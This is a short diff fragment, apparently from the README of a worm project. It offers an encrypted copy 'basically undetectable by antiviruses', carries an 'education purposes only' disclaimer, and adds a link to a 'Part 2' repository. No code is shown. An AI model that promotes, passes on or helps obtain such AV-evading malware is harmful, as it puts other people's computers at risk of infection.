@@ -23,3 +23,4 @@ if requested i will give you guys a second encrypted copy which is basically
 undetectable by antiviruses:)
 
 !!THIS IS FOR EDUCATION PURPOSES ONLY, I WILL NOT TAKE ANY RESPONSIBILITY IF YOU FUCK UP AND USE THIS WORM INCORRECTLY!!
+Part 2 here: https://github.com/MyLifeIsSakura/HelloFriendBash
